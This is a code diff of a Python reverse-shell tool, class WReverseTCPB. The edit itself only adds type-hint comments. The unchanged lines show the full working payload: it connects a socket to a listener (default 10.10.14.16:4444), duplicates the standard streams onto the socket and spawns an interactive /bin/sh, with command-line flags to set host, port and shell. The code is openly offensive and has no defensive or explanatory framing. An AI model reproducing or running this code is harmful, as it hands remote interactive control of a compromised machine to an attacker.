@@ -18,11 +18,11 @@ class WReverseTCPB:
     FLAGS = ["-lh", "--lhost", "-lp", "--lport","-s", "--shell", "-v", "--version", "-h", "--help"];
 
     def __init__(self, lhost="10.10.14.16", lport=4444, shell="/bin/sh"):
-        self.lhost = lhost;
-        self.lport = lport;
-        self.shell = shell;
+        self.lhost = lhost #type: str
+        self.lport = lport #type: int
+        self.shell = shell #type: str
 
-    def checkArgs(self):
+    def checkArgs(self):#type: (WReverseTCPB) -> None
         if(len(sys.argv) == 1):
             return;
 
@@ -40,7 +40,7 @@ class WReverseTCPB:
             print("Reverse TCP version: {}".format(WReverseTCPB.VERSION));
             exit();
 
-    def setArguments(self, flag, arg):
+    def setArguments(self, flag, arg):#type: (WReverseTCPB, str, str) -> None
         flags = WReverseTCPB.FLAGS;
 
         if(flag not in flags):
@@ -53,7 +53,7 @@ class WReverseTCPB:
         elif(flag == flags[4] or flag == flags[5]):
             self.shell = arg;
 
-    def iterateArguments(self):
+    def iterateArguments(self):#type: (WReverseTCPB) -> None
         n = len(sys.argv);
         if(n == 1):
             return;
@@ -62,7 +62,7 @@ class WReverseTCPB:
                 continue;
             self.setArguments(sys.argv[i], sys.argv[i+1]);
 
-    def reverseTCP(self):
+    def reverseTCP(self):#type: (WReverseTCPB) -> None
         print("Initiating connection: {}:{} {}".format(self.lhost, self.lport, self.shell));
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
         s.connect((self.lhost, self.lport));
@@ -71,7 +71,7 @@ class WReverseTCPB:
         os.dup2(s.fileno(), 2);
         p = subprocess.call([self.shell, "-i"]);
 
-def __main__():
+def __main__():#type: () -> None
     
     wrtcpb = WReverseTCPB();
     try:
